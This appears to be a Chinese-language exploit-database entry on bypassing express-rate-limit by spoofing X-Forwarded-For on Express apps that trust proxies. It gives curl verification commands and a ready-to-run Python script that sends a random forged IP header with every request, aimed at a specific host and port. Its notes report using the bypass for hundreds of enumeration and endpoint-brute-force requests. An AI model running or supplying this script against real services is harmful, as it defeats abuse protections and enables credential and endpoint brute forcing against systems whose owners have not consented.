# express-rate-limit 限速绕过：伪造 X-Forwarded-For 变换限速 key

- **code**: express-rate-limit-限速绕过-伪造-x-forwarded-for-变换限速-key
- **kind**: script
- **category**: methodology
- **component**: Node.js Express + express-rate-limit
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.118:15555（AWS Launcher 后端）实测：直连 /api/auth/google/url 无 XFF 返回 429 "Too many requests from this IP"；同一请求加 -H "X-Forwarded-For: 203.0.113.93" 返回 200 并正常返回 JSON 数据。确认服务端 trust proxy 生效、限速 key 取自 XFF。绕过生效后连续完成 400 次枚举+202 次端点穷举未被限速。
- **path**: pocs/express-rate-limit-限速绕过-伪造-x-forwarded-for-变换限速-key/rate_limit_bypass_xff.py
- **tags**: 限速绕过,rate-limit,trust-proxy,X-Forwarded-For,Express
- **created_at**: 2026-09-27T19:15:08.826Z
- **found_by**: exploit

## 描述

当 Express 应用使用 express-rate-limit 且设置了 app.set('trust proxy', true)（或 trust proxy 为数字/函数且信任上游）时，限速中间件的默认 keyGenerator 取 req.ip，而 req.ip 会从 X-Forwarded-For 最左值解析。攻击者只需每次请求伪造一个随机 X-Forwarded-For，即可让每个"虚拟 IP"只占用一次配额，从而完全绕过 IP 级限速。判定方法：同一端点分别在不带 XFF 与带随机 XFF 两种情况下各发一次，若前者 429、后者 200，即确认可绕过。注意：走 CDN（如 Cloudflare）回源时 CDN 会覆盖 XFF，此时不可控，应直连源站端口测试。

## 用法

```
验证：curl -s -o /dev/null -w "%{http_code}" --noproxy "*" http://TARGET:PORT/api/endpoint   # 期望 429
curl -s -o /dev/null -w "%{http_code}" --noproxy "*" -H "X-Forwarded-For: 203.0.113.7" http://TARGET:PORT/api/endpoint   # 期望 200
批量绕过：在 python 的请求封装里每次随机生成 XFF，见下方 content。
```

## 正文

```
import random, json, urllib.request, urllib.error

def rnd_ip():
    return "%d.%d.%d.%d" % (random.randint(11, 222), random.randint(0, 255),
                            random.randint(0, 255), random.randint(1, 254))

OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))  # 显式禁用代理

def call(url, method="GET", body=None, token=None, extra=None):
    xff = rnd_ip()
    hdrs = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Forwarded-For": xff,
        "X-Real-IP": xff,
        "Client-IP": xff,
        "X-Originating-IP": xff,
    }
    if token:
        hdrs["Authorization"] = "Bearer " + token
    if extra:
        hdrs.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with OPENER.open(req, timeout=25) as r:
            return r.status, r.read(20000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(20000).decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)

if __name__ == "__main__":
    print(call("http://203.0.113.118:15555/api/auth/google/url"))

```
